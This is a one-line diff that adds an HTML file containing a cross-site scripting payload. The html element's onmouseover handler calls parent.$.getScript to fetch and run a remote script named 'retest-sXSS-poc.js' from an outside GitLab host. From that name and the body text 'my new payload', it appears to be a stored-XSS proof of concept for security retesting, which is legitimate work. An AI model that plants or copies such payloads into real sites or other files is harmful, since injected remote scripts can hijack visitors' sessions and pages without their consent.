@@ -1,0 +1,1 @@
+<html onmouseover="/****ueoaeoauaoeu**/parent.$.getScript('//https://gitlab.optivlabs.com/jacob.riesser/somepayloads/retest-sXSS-poc.js');//'" id="someId"><body>This is my new payload onmouseover</html>
